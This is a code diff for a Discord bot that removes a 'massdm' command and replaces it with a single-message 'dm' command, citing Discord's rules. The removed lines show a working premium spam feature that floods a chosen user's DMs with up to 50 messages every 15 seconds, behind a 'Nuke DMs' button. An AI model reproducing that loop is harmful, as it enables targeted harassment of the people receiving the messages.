+@bot.hybrid_command(name="dm", description="Owner messaging — bulk/repeated DM spam disabled for Discord safety")
 @app_commands.describe(
-    user="Who to DM (member in this server)",
-    amount="How many messages to send (1-50, default 3)",
+    user="Who to contact (member in this server)",
+    amount="Ignored — bulk send disabled",
     user_id="User ID if they are not in the server",
-    message="Premium only — custom DM text (leave empty for default)",
+    message="Optional single message text",
 )
 async def massdm_prefix(
     ctx,
     user: discord.Member = None,
-    amount: int = 3,
+    amount: int = 1,
     user_id: str = "",
     message: str = "",
 ):
+    """Unsolicited bulk/repeated DMs are disabled (Discord ToS). Allows one owner-initiated message only."""
     if not has_owner_access(ctx.author):
-        return await ctx.send("🔒 Repeated/custom DM tools are strictly bot-owner only. Use Discord's normal messaging for individual contact.")
-    _is_premium = True  # owner-only access for this high-impact messaging command
-    message = (message or "").strip()
-    user_id = (user_id or "").strip()
-    try:
-        amount = max(1, min(int(amount or 3), 50))
-    except Exception:
-        amount = 3
-
-    # Premium-only guard for custom message
-    if message and not _is_premium:
-        return await ctx.send(
-            embed=discord.Embed(
-                description="❌ Custom DM messages are **Premium only**.\nUpgrade to set a custom message — free tier uses the default.",
-                color=COLORS["error"],
-            ),
-            ephemeral=False,
-        )
-
-    # ── Resolve target ─────────────────────────────────────────────────
-    # If user is None but something was typed, the first word may have been
-    # consumed as user_id accidentally — try re-parsing from user_id field.
-    if user is None:
-        # Also handle: ,massdm 123456 some message (prefix: user_id is positional)
-        raw_id = user_id.strip()
+        return await ctx.send("🔒 Owner/co-owner only.")
+    target_user = user
+    if target_user is None:
+        raw_id = (user_id or "").strip()
         if not raw_id:
             return await ctx.send(
                 embed=discord.Embed(
                     description=(
-                        "❌ Provide a target.\n"
-                        "• `,massdm @user` — mention\n"
-                        "• `,massdm user_id:123456` — by ID (no mutual server needed)\n"
-                        "• `,massdm @user Custom message` — custom msg (Owner only)"
+                        "❌ Provide a target for a **single** message.\n"
+                        "• `,dm @user your message`\n"
+                        "• `,dm user_id:123456 message:hello`\n\n"
+                        "Bulk/repeated mass-DM is **disabled** (Discord rules)."
                     ),
                     color=COLORS["error"],
                 ),
-                ephemeral=False,
             )
         try:
-            _resolved = await ctx.bot.fetch_user(int(raw_id))
+            target_user = await ctx.bot.fetch_user(int(raw_id))
         except (ValueError, discord.NotFound, discord.HTTPException):
-            return await ctx.send(
-                embed=discord.Embed(description="❌ Could not find that user ID.", color=COLORS["error"]),
-                ephemeral=False,
-            )
-
-        class _FakeTarget:
-            def __init__(self, u):
-                self.id           = u.id
-                self.display_name = u.display_name
-                self.mention      = u.mention
-                self.bot          = u.bot
-        user = _FakeTarget(_resolved)
-
-    if user.bot:
-        return await ctx.send(
-            embed=discord.Embed(description="❌ Can't target a bot.", color=COLORS["error"]),
-            ephemeral=False,
-        )
-    if user.id in OWNER_IDS:
-        return await ctx.send(
-            embed=discord.Embed(description="❌ Can't target the bot owner.", color=COLORS["error"]),
-            ephemeral=False,
-        )
-
-    _author_id   = ctx.author.id
-    total_bots   = 1  # single-bot mode
-    custom_msg   = message.strip() or None  # None = use global _MASSDM_DEFAULT_MSG / _MASSDM_TEXT
-
-    try:
-        await ctx.message.delete()
-    except Exception:
-        pass
-
-    #  FREE TIER — 5 bots, 3 messages each, fires ONCE only
-    if not _is_premium:
-        class FreeDmConfirm(discord.ui.View):
-            def __init__(self):
-                super().__init__(timeout=30)
-
-            @discord.ui.button(label="Send 🔥", style=discord.ButtonStyle.danger)
-            async def confirm(self_v, btn: discord.Interaction, button: discord.ui.Button):
-                if btn.user.id != _author_id:
-                    return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
-                self_v.stop()
-                await btn.response.edit_message(
-                    embed=discord.Embed(
-                        title="📬 Free MassDm — Sending…",
-                        description=(
-                            f"Sending to **{user.display_name}**…\n"
-                            f"**1 bot** · **{amount} messages** · fires once 💣\n\n"
-                            f"⚠️ Upgrade to Premium for infinite loop every 15s!"
-                        ),
-                        color=COLORS["warn"],
-                    ),
-                    view=None,
-                )
-                asyncio.create_task(_run_massdm_free_wave(user.id, amount=amount))
-
-            @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
-            async def cancel(self_v, btn: discord.Interaction, button: discord.ui.Button):
-                if btn.user.id != _author_id:
-                    return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
-                self_v.stop()
-                await btn.response.edit_message(
-                    embed=discord.Embed(description="❌ Cancelled.", color=COLORS["error"]),
-                    view=None,
-                )
-
+            return await ctx.send(embed=discord.Embed(description="❌ Could not find that user ID.", color=COLORS["error"]))
+    if getattr(target_user, "bot", False):
+        return await ctx.send(embed=discord.Embed(description="❌ Can't target a bot.", color=COLORS["error"]))
+    if int(target_user.id) in OWNER_IDS:
+        return await ctx.send(embed=discord.Embed(description="❌ Can't target the bot owner.", color=COLORS["error"]))
+    content = (message or "").strip()
+    if not content:
         return await ctx.send(
             embed=discord.Embed(
-                title="📬 Free MassDm",
                 description=(
-                    f"Target: **{user.display_name}** ({user.mention})"
-                    + chr(10) + chr(10)
-                    + f"🆓 **Free tier:** **{amount}** messages · one-time (single bot)"
-                    + chr(10) + chr(10)
-                    + "💎 **Premium:** custom message · loops every **15s**"
-                    + chr(10)
-                    + "Contact the bot owner to upgrade."
+                    "🛡️ Bulk/repeated mass-DM is disabled for Discord safety.\n"
+                    "To send **one** owner message, provide text: `,dm @user Hello`."
                 ),
-                color=COLORS["info"],
-            ).set_footer(text="Expires in 30s"),
-            view=FreeDmConfirm(),
-            ephemeral=False,
+                color=COLORS["warn"],
+            )
         )
+    try:
+        await target_user.send(content[:2000])
+        await ctx.send(embed=discord.Embed(
+            title="✅ Message sent",
+            description=f"Sent **one** message to {getattr(target_user, 'mention', target_user)}.",
+            color=COLORS["success"],
+        ))
+    except discord.Forbidden:
+        await ctx.send(embed=discord.Embed(description="❌ Cannot DM that user (DMs closed or blocked).", color=COLORS["error"]))
+    except Exception as ex:
+        await ctx.send(embed=discord.Embed(description=f"❌ Failed to send: `{ex}`", color=COLORS["error"]))
 
-    #  PREMIUM TIER — amount selector + custom message + loop
-    msg_preview = (
-        f"\n📝 **Custom message:** {custom_msg[:80]}{'…' if custom_msg and len(custom_msg) > 80 else ''}"
-        if custom_msg else "\n📝 **Custom message:** (using default / none set)"
-    )
-
-    class AmountSelect(discord.ui.Select):
-        def __init__(self, default_amt: int):
-            options = []
-            for n in (1, 2, 3, 5, 10, 15, 20, 25, 30, 40, 50):
-                options.append(discord.SelectOption(
-                    label=f"{n} messages",
-                    value=str(n),
-                    description=f"Send {n} message(s) per wave",
-                    default=(n == default_amt),
-                    emoji="📬",
-                ))
-            super().__init__(placeholder="How many messages per wave? (1–50)", min_values=1, max_values=1, options=options)
-            self.chosen = default_amt
-
-        async def callback(self, interaction: discord.Interaction):
-            if interaction.user.id != _author_id:
-                return await interaction.response.send_message("❌ Not your menu.", ephemeral=True)
-            self.chosen = int(self.values[0])
-            await interaction.response.defer()
-
-    class MassDmConfirmPrefix(discord.ui.View):
-        def __init__(self, default_amt: int):
-            super().__init__(timeout=60)
-            self.amount_select = AmountSelect(default_amt)
-            self.add_item(self.amount_select)
-
-        @discord.ui.button(label="Nuke DMs 🔥", style=discord.ButtonStyle.danger, row=1)
-        async def confirm(self_v, btn: discord.Interaction, button: discord.ui.Button):
-            if btn.user.id != _author_id:
-                return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
-            self_v.stop()
-            chosen_amt = max(1, min(int(getattr(self_v.amount_select, "chosen", amount) or 3), 50))
-            old_ev = _MASSDM_STOP_EVENTS.get(user.id)
-            if old_ev:
-                old_ev.set()
-            old = _MASSDM_TASKS.get(user.id)
-            if old and not old.done():
-                old.cancel()
-            _MASSDM_AMOUNTS[user.id] = chosen_amt
-            await btn.response.edit_message(
-                embed=discord.Embed(
-                    title="📬 Mass DMing — LOOP ACTIVE 🔄",
-                    description=(
-                        f"💀 Spamming **{user.display_name}** every **15 seconds** 🔥\n"
-                        f"**1 bot** · **{chosen_amt} messages** per wave · infinite loop 💣"
-                        f"{msg_preview}\n"
-                        f"Use `,stopdm @{user.display_name}` to stop."
-                    ),
-                    color=COLORS["warn"],
-                ).set_footer(text="Coolbot 🐻‍❄️ Premium MassDm — looping every 15s"),
-                view=None,
-            )
-            _status_ch_id = ctx.channel.id if ctx.channel else 0
-            if custom_msg:
-                global _MASSDM_TEXT, _MASSDM_DEFAULT_MSG
-                _MASSDM_DEFAULT_MSG = custom_msg
-                _MASSDM_TEXT = custom_msg
-            _MASSDM_TASKS[user.id] = asyncio.create_task(
-                _massdm_loop_task(user.id, user.display_name, btn.user.display_name, _status_ch_id)
-            )
-
-        @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary, row=1)
-        async def cancel(self_v, btn: discord.Interaction, button: discord.ui.Button):
-            if btn.user.id != _author_id:
-                return await btn.response.send_message("❌ Not your menu.", ephemeral=False)
-            self_v.stop()
-            await btn.response.edit_message(
-                embed=discord.Embed(description="❌ MassDm cancelled.", color=COLORS["error"]),
-                view=None,
-            )
-
-    await ctx.send(
-        embed=discord.Embed(
-            title="⚠️ Confirm Premium MassDm — Choose Amount",
-            description=(
-                f"Target: **{user.display_name}** ({user.mention})\n\n"
-                f"Select **how many messages** per wave (dropdown), then press **Nuke DMs 🔥**.\n"
-                f"Loops every **15s** until you `,stopdm`.\n"
-                f"{msg_preview}"
-            ),
-            color=COLORS["warn"],
-        ).set_footer(text="Premium · Choose amount then confirm · Expires in 60s"),
-        view=MassDmConfirmPrefix(amount),
-        ephemeral=False,
-    )
-
-
-#  ,addbot — invite link for this bot (Administrator)
-BOT_INVITE_URL = (
-    "https://discord.com/oauth2/authorize"
-    "?client_id=1563415330569719909"
-    "&permissions=8"
-    "&integration_type=0"
-    "&scope=bot"
-)
 
 @bot.command(name="addbot", aliases=["invitebot", "botinvite", "inviteme"])
 async def addbot_cmd(ctx, guild_id: str = None):
